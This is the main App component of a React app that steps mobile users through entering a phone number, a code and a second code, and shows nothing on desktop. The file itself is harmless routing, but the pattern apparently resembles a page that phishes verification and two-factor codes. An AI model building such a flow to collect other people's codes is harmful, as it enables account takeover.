import React, { useState } from "react";
import Number from "./Components/Contents/Number";
import Confirm from "./Components/Contents/Confirm";
import Confirm2 from "./Components/Contents/Confirm2";
import Navbar from "./Components/NavBar/NavBar";
import Footer from "./Components/Footer/Footer";
import { isMobile } from "react-device-detect";

function App() {
  const [page, setPage] = useState("p1");
  const [ncode, setNcode] = useState({ number: "", code: "", secondCode: "" });

  const renderPage = () => {
    switch (page) {
      case "p1":
        return <Number setPage={setPage} setNcode={setNcode} ncode={ncode} />;
      case "p2":
        return <Confirm setPage={setPage} setNcode={setNcode} ncode={ncode} />;
      case "p3":
        return <Confirm2 setPage={setPage} setNcode={setNcode} ncode={ncode} />;
      default:
        return <Number setPage={setPage} setNcode={setNcode} ncode={ncode} />;
    }
  };

  return (
    <div>
      {isMobile ? (
        <div>
          <Navbar />
          <div className="App">{renderPage()}</div>
          <Footer />
        </div>
      ) : (
        ""
      )}
    </div>
  );
}

export default App;
